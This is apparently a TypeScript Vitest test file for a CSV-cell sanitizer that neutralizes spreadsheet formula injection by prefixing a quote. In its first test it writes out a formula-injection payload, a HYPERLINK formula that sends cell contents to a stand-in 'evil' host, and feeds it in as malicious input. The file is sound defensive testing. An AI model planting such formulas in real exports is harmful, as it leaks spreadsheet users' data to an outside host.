import { describe, expect, it } from "vitest";
import { sanitizeCsvCell } from "./format";

describe("sanitizeCsvCell", () => {
  it("prefixes a leading quote on values starting with a formula-trigger char", () => {
    for (const trigger of ["=", "+", "-", "@"]) {
      const malicious = `${trigger}HYPERLINK("http://evil/?"&A1,"x")`;
      expect(sanitizeCsvCell(malicious)).toBe(`'${malicious}`);
    }
  });

  it("leaves normal values untouched", () => {
    expect(sanitizeCsvCell("Normal Page Title")).toBe("Normal Page Title");
    expect(sanitizeCsvCell(42)).toBe("42");
    expect(sanitizeCsvCell(true)).toBe("true");
    expect(sanitizeCsvCell(undefined)).toBe("");
    expect(sanitizeCsvCell(null)).toBe("");
  });
});
